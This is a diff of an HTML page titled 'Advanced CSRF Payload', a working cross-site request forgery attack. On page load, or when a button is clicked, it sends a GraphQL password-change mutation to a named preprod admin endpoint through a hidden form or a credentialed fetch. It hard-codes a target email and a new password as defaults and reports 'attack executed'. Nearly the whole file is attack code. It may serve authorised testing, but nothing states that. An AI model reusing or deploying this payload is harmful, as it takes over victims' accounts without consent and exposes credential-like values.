@@ -1,33 +1,110 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Advanced CSRF Payload</title>
+</head>
 <body>
-<script>
-// Parse URL parameters
-const params = new URLSearchParams(window.location.search);
-const targetUrl = params.get('targetUrl');
-const email = params.get('email');
-const password = params.get('password');
-const autoRun = params.get('autoRun');
-const delay = parseInt(params.get('delay')) * 1000;
+    <script>
+        // Parse URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetUrl = urlParams.get('targetUrl') || 'https://v2preprodadmin.smartpi.pe/graphql';
+        const email = urlParams.get('email') || 'aatrala+owner2@gmail.com';
+        const password = urlParams.get('password') || 'Smart@pipe@123$$';
+        const autoRun = urlParams.get('autoRun') || 'true';
+        const delay = parseInt(urlParams.get('delay') || '3');
+        const method = urlParams.get('method') || '1';
 
-if (autoRun === 'true') {
-    setTimeout(() => {
-        // Create form dynamically
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = targetUrl;
-        form.enctype = 'multipart/form-data';
-        
-        const queryInput = document.createElement('input');
-        queryInput.type = 'hidden';
-        queryInput.name = 'query';
-        queryInput.value = `mutation{UPDATE_PASSWORD(email:"${email}",password:"${password}")}`;
-        
-        form.appendChild(queryInput);
-        document.body.appendChild(form);
-        form.submit();
-    }, delay);
-}
-</script>
+        console.log('=== ADVANCED CSRF ATTACK ===');
+        console.log('Target URL:', targetUrl);
+        console.log('Target Email:', email);
+        console.log('New Password:', password);
+        console.log('Auto Run:', autoRun);
+        console.log('Delay:', delay);
+        console.log('Method:', method);
+
+        function executeCSRFAttack() {
+            console.log('🚨 Executing CSRF Attack...');
+            
+            if (method === '1' || method === '9') {
+                // Form-based CSRF (Method 1 and 9)
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = targetUrl;
+                form.enctype = 'application/x-www-form-urlencoded';
+                form.style.display = 'none';
+
+                // Add form fields
+                const operationName = document.createElement('input');
+                operationName.type = 'hidden';
+                operationName.name = 'operationName';
+                operationName.value = 'UPDATE_PASSWORD';
+                form.appendChild(operationName);
+
+                const variables = document.createElement('input');
+                variables.type = 'hidden';
+                variables.name = 'variables';
+                variables.value = JSON.stringify({
+                    email: email,
+                    password: password
+                });
+                form.appendChild(variables);
+
+                const query = document.createElement('input');
+                query.type = 'hidden';
+                query.name = 'query';
+                query.value = 'mutation UPDATE_PASSWORD($email: String!, $password: String!) { updatePortalUser(where: {email: $email}, data: {password: $password}) { password { isSet __typename } __typename } }';
+                form.appendChild(query);
+
+                document.body.appendChild(form);
+                form.submit();
+
+                console.log('✅ Form-based CSRF attack submitted!');
+            } else if (method === '2') {
+                // Fetch-based CSRF (Method 2)
+                fetch(targetUrl, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        operationName: "UPDATE_PASSWORD",
+                        variables: {
+                            email: email,
+                            password: password
+                        },
+                        query: "mutation UPDATE_PASSWORD($email: String!, $password: String!) { updatePortalUser(where: {email: $email}, data: {password: $password}) { password { isSet __typename } __typename } }"
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('✅ Fetch-based CSRF attack result:', data);
+                })
+                .catch(error => {
+                    console.error('❌ Fetch-based CSRF attack failed:', error);
+                });
+            }
+
+            // Update page content
+            document.body.innerHTML = `
+                <h1>🔴 CSRF Attack Executed</h1>
+                <p><strong>Target:</strong> ${email}</p>
+                <p><strong>New Password:</strong> ${password}</p>
+                <p><strong>Method:</strong> ${method}</p>
+                <p><strong>Status:</strong> Attack completed - check if password changed!</p>
+            `;
+        }
+
+        // Auto-execute if enabled
+        if (autoRun === 'true') {
+            console.log(`⏳ Auto-executing CSRF attack in ${delay} seconds...`);
+            setTimeout(executeCSRFAttack, delay * 1000);
+        } else {
+            document.body.innerHTML = `
+                <h1>CSRF Attack Ready</h1>
+                <button onclick="executeCSRFAttack()">Execute Attack Manually</button>
+            `;
+        }
+    </script>
 </body>
 </html>
